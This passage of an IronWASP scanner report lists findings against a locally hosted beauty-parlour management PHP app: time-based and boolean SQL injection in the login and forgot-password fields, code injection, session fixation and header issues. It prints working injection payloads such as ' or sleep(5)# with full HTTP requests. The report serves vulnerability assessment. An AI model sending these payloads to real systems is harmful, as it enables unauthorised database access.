+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=uvg8vjeao6uo5m7f5b6e2u4v6v<br><br>email=<span class='hlg'>'+or+sleep(5)%23</span>&amp;contactno=aa&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 14042 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding20'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding19'>&lt;&lt;&lt;</a><a href='#finding21'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>username</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>username</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)#</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>10638</span> milliseconds. Normally this particular request is processed at around </span>0</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)#</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/index.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=uvg8vjeao6uo5m7f5b6e2u4v6v<br><br>username=<span class='hlg'>'+or+sleep(5)%23</span>&amp;password=lll&amp;login=Sign+In<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 10638 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding21'>
+<div class='high_finding_title'>SQL Injection Detected</div>
+<div class='finding_nav_links'><a href='#finding20'>&lt;&lt;&lt;</a><a href='#finding22'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>contactno</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>SQL Injection was identified in the <span class='ico'><b>contactno</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/SQL_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reasons:<br>
+<div class='reason'><div class='reason_title'>Reason 1:</div>
+IronWASP sent four payloads to the application with SQL code snippets in them.<br>Payload A - <span class='hlg'>aaxxx' or 's'='s</span><br>Payload B - <span class='hlg'>aaxxx' or 's'='r</span><br>Payload C - <span class='hlg'>aaxxx' or 't'='t</span><br>Payload D - <span class='hlg'>aaxxx' or 't'='r</span><br>Payload A and C have a boolean condition after the <span class='hlg'>OR</span> keyword that will evaluate to true. The boolean condition in Payload B and D would evaluate to false.<br>The response for Payload A and C were similar to each other and were different from the response received for Payload B and D. This indicates that the application was actually evaluating the boolean condition in the payloads. So since Payload A and C both has a true boolean condition their responses are similar, C and D had a false boolean condition.<br>If the application was not actually evaluating the boolean condition then all four payload should have returned very similar responses. Therefore this indicates that SQL syntax from the payload is executed as part of the SQL query on the server.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+Manually analyze the responses received for the four payloads and confirm if the type of similarity explained above actually exists in them. Try resending the same payloads again but with values in the boolean expression and check if this behaviour is repeated.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='s which evaluates to true. The payload is aaxxx' or 's'='s</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=uvg8vjeao6uo5m7f5b6e2u4v6v<br><br>email=aa&amp;contactno=<span class='hlg'>aaxxx'+or+'s'%3d's</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean true condition based payload. This response is equal to the response of the second boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 's'='r which evaluates to false. The payload is aaxxx' or 's'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=uvg8vjeao6uo5m7f5b6e2u4v6v<br><br>email=aa&amp;contactno=<span class='hlg'>aaxxx'+or+'s'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the first boolean false condition based payload. This response is equal to the response of the second boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='t which evaluates to true. The payload is aaxxx' or 't'='t</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=uvg8vjeao6uo5m7f5b6e2u4v6v<br><br>email=aa&amp;contactno=<span class='hlg'>aaxxx'+or+'t'%3d't</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean true condition based payload. This response is equal to the response of the first boolean true condition payload and different from the responses of the boolean false condition payloads.</span><br><br>
+</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains the conditional operator 'or' followed by the SQL condition 't'='r which evaluates to false. The payload is aaxxx' or 't'='r</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=uvg8vjeao6uo5m7f5b6e2u4v6v<br><br>email=aa&amp;contactno=<span class='hlg'>aaxxx'+or+'t'%3d'r</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>This response is the result of the second boolean false condition based payload. This response is equal to the response of the first boolean false condition payload and different from the responses of the boolean true condition payloads.</span><br><br>
+</div>
+</div>
+<div class='reason'><div class='reason_title'>Reason 2:</div>
+IronWASP sent <span class='hlg'>' or sleep(5)='</span> as payload to the application. This payload has a small snippet of SQL code that will cause the database server to sleep for <span class='hlg'>5000</span> milliseconds. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>5013</span> milliseconds. Normally this particular request is processed at around </span>0</span> milliseconds. This indicates that the injected SQL code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a SQL query snippet which if executed will cause a delay of 5000 milliseconds. The payload is ' or sleep(5)='</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/forgot-password.php HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=uvg8vjeao6uo5m7f5b6e2u4v6v<br><br>email=aa&amp;contactno=<span class='hlg'>'+or+sleep(5)%3d'</span>&amp;submit=Reset<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 5013 milliseconds to get this response. It took so long because of the 5000 milliseconds delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding22'>
+<div class='high_finding_title'>Code Injection Found</div>
+<div class='finding_nav_links'><a href='#finding21'>&lt;&lt;&lt;</a><a href='#finding23'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icr'>High</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Medium</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Active Scanning</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></td></div></tr>
+<tr><div class='affected_parameter'><td><span class='fname'>Affected Parameter:</span></td><td>password</td></div></tr>
+<tr><div class='affected_section'><td><span class='fname'>Parameter Location:</span></td><td>Body</td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>Code Injection was identified in the <span class='ico'><b>password</b></span> parameter of the <span class='ico'><b>Body</b></span> section of the scanned request.<br><br>Code Injection is an issue where it is possible to inject and execute code on the server-side. For more details on this issue refer <span class='icb'>https://www.owasp.org/index.php/Code_Injection</span><br><br></div>
+<div class='reason_section_title'>Reasons:</div>
+IronWASP has reported this issue because of the following reason:<br>
+<div class='reason'><div class='reason_title'>Reason:</div>
+IronWASP sent <span class='hlg'>sleep(5);#</span> as payload to the application. This payload has a small snippet of code - <span class='hlg'>sleep(5);</span>. If this code is executed then the application will return the response <span class='hlg'>5000</span> milliseconds later than usual. After the payload was injected the response from the application took <span class='hlg'>9029</span> milliseconds. Normally this particular request is processed at around <span class='hlg'>16</span> milliseconds. This indicates that the injected code snippet could have been executed on the server-side.
+<div class='fpa_check'><div class='fpa_check_title'>False Positive Check Assistance:</div>
+To check if this was a valid case or a false positive you can manually inject the same payload but by changing the number of seconds of delay to different values. Then you can observe if the time taken for the response to be returned is affected accordingly.<br>If you discover that this issue was a false positive then please consider reporting this to <span class='icb'>lava<span class='inv'></span>@<span class='inv'></span>ironwasp<span class='inv'></span>.<span class='inv'></span>org</span>. Your feedback will help improve the accuracy of the scanner.
+</div>
+<div class='trigger_desc'>The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.</div>
+<div class='trigger'>
+<span class='ihh'> Request sent by Scanner: </span><br><br><span class='icb'>The payload in this request contains a code snippet which if executed will cause the response to be delayed by 5000 milliseconds. The code snippet is: sleep(5);</span><br><br>POST http://127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/ HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br>username=ssss&amp;password=<span class='hlg'>sleep(5)%3b%23</span>&amp;login=Sign+In<br><br><span class='ihh'> Information about the Response from the Server: </span><br><br><span class='icb'>It took 9029 milliseconds to recieve the response from the server. It took so long because of the 5000 millisecond delay caused by the payload.</span><br><br>
+</div>
+</div>
+</div>
+<div class='finding' id='finding23'>
+<div class='medium_finding_title'>Cookie PHPSESSID missing the HttpOnly flag</div>
+<div class='finding_nav_links'><a href='#finding22'>&lt;&lt;&lt;</a><a href='#finding24'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='ico'>Medium</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>High</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Passive Analysis</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/</span></td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>The HttpOnly flag was missing on the cookie: PHPSESSID. This may allow an attacker to get the cookie information using XSS attacks.</div>
+<div class='trigger'>
+<span class='ihh'> Analyzed Response: </span><br><br><span class='icb'>The value of the cookie is not protected by HttpOnly flag and hence becomes accessible from JavaScript</span><br><br>HTTP/1.1 200 OK<br>Date: Mon, 04 Sep 2023 18:27:34 GMT<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br><span class='hlg'>Set-Cookie: PHPSESSID=3qcdml6ef2h1hn1gp40u16mdpp; path=/</span><br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Content-Length: 11841<br><br><br>
+</div>
+</div>
+<div class='finding' id='finding24'>
+<div class='medium_finding_title'>Sensitive Form loaded and submitted Insecurely</div>
+<div class='finding_nav_links'><a href='#finding23'>&lt;&lt;&lt;</a><a href='#finding25'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='ico'>Medium</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>High</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Passive Analysis</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>Form with sensitive contents, which includes password fields, is loaded and submitted over HTTP</div>
+<div class='trigger'>
+<span class='ihh'> Analyzed Request: </span><br><br><span class='icb'>This Request was made over HTTP</span><br><br>GET <span class='hlg'>http://</span>127.0.0.1/4.quality-beauty-parlour-management-system/bea/admin/ HTTP/1.1<br>Host: 127.0.0.1<br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Cookie: PHPSESSID=v2fb27t21jfijglkosqbk37lcj<br><br><br><br><span class='ihh'> Interesting part of Analyzed Response: </span><br><br><span class='icb'>The HTML form containing password fields is displayed below. The unnecessary elements from this form have been stripped away for clarity.</span><br><br>IronWASP is not able to automatically highlight the interesting section of the Response, you would have to identify it manually.<br>IronWASP's Passive Analyzer reported the following text as being of interest in this case:<br><br> <span class='icb'>----- START OF INTERESTING TEXT -----</span> <br>&lt;form role=&quot;form&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&lt;input type=&quot;text&quot; class=&quot;user&quot; name=&quot;username&quot; placeholder=&quot;Username&quot; required=&quot;true&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;lock&quot; placeholder=&quot;Password&quot; required=&quot;true&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;Sign In&quot;&gt;&lt;/form&gt;<br> <span class='icb'>----- END OF INTERESTING TEXT -----</span> <br><br>
+</div>
+</div>
+<div class='finding' id='finding25'>
+<div class='medium_finding_title'>Session Fixation Found</div>
+<div class='finding_nav_links'><a href='#finding24'>&lt;&lt;&lt;</a><a href='#finding26'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='ico'>Medium</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>Low</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Passive Analysis</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/index.php</span></td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>The application does not set a new Session ID in the cookie after what appears to be an authentication attempt by the user. If this was a successful login and the Session IDs are stored in cookies then this application is affected by Session Fixation vulnerability.</div>
+<div class='trigger'>
+
+</div>
+</div>
+<div class='finding' id='finding26'>
+<div class='low_finding_title'>Server leaks version number</div>
+<div class='finding_nav_links'><a href='#finding25'>&lt;&lt;&lt;</a><a href='#finding27'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icy'>Low</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>High</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Passive Analysis</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/</span></td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>The Web Server's banner contains the version number of the server - Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4. The version number found is 2.4.56</div>
+<div class='trigger'>
+<span class='ihh'> Analyzed Response: </span><br><br><span class='icb'>The Server header of this Response indicates the server version as 2.4.56</span><br><br>HTTP/1.1 200 OK<br>Date: Mon, 04 Sep 2023 18:27:34 GMT<br><span class='hlg'>Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4</span><br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Content-Length: 11841<br><br><br>
+</div>
+</div>
+<div class='finding' id='finding27'>
+<div class='low_finding_title'>AutoComplete Enabled on Password Fields</div>
+<div class='finding_nav_links'><a href='#finding26'>&lt;&lt;&lt;</a><a href='#finding28'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</td><td></span>Vulnerability</td></div></tr>
+<tr><div class='severity'><td><span class='fname'>Severity:</span></td><td><span class='icy'>Low</span></td></div></tr>
+<tr><div class='confidence'><td><span class='fname'>Confidence:</span></td><td>High</td></div>
+</tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Passive Analysis</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/admin/</span></td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>AutoComplete feature has not been disabled on the form/fields that accept Passwords from users</div>
+<div class='trigger'>
+<span class='ihh'> Information about the Analyzed Response: </span><br><br><span class='icb'>This response contains INPUT elements whose type attribute is password but their autocomplete attribute is not set to 'off'</span><br><br>
+</div>
+</div>
+<div class='finding' id='finding28'>
+<div class='info_finding_title'>Runs on Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4</div>
+<div class='finding_nav_links'><a href='#finding27'>&lt;&lt;&lt;</a><a href='#finding29'>&gt;&gt;&gt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</span></td><td><span class='icb'>Information</span></td></div></tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Passive Analysis</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/</span></td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>The Web Server returned this banner in its response headers - Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4</div>
+<div class='trigger'>
+<span class='ihh'> Analyzed Response: </span><br><br>HTTP/1.1 200 OK<br>Date: Mon, 04 Sep 2023 18:27:34 GMT<br><span class='hlg'>Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4</span><br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Content-Length: 11841<br><br><br>
+</div>
+</div>
+<div class='finding' id='finding29'>
+<div class='info_finding_title'>Technologies identified on Server</div>
+<div class='finding_nav_links'><a href='#finding28'>&lt;&lt;&lt;</a></div>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='type'><td><span class='fname'>Type:</span></td><td><span class='icb'>Information</span></td></div></tr>
+<tr><div class='type'><td><span class='fname'>Found By:</span></td><td>Passive Analysis</td></div></tr>
+</table>
+<br>
+<table cellpadding='2' cellspacing='2'>
+<tr><div class='affected_host'><td><span class='fname'>Affected Site:</span></td><td>http://127.0.0.1/</td></div></tr>
+<tr><div class='affected_url'><td><span class='fname'>Affected Url:</span></td><td><span class='affected_url'>/4.quality-beauty-parlour-management-system/bea/</span></td></div></tr>
+</table>
+<div class='desc'><div class='desc_title'>Description:</div>The server makes use of the following technologies:<br> - PHP/8.2.4</div>
+<div class='trigger'>
+<span class='ihh'> Analyzed Response: </span><br><br>HTTP/1.1 200 OK<br>Date: Mon, 04 Sep 2023 18:27:34 GMT<br>Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t <span class='hlg'>PHP/8.2.4</span><br>Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t <span class='hlg'>PHP/8.2.4</span><br>X-Powered-By: <span class='hlg'>PHP/8.2.4</span><br><span class='icb'>[---- Snipped parts of HTTP headers section for brevity ----]</span><br>Content-Length: 11841<br><br><br>
+</div>
+</div>
+</div>
+
+<div id='report_footer'>
+    This report was generated by IronWASP's Reporting Engine on Tuesday, September 5, 2023 at 9:17:59 PM
+</div>
+
+</body></html>
+
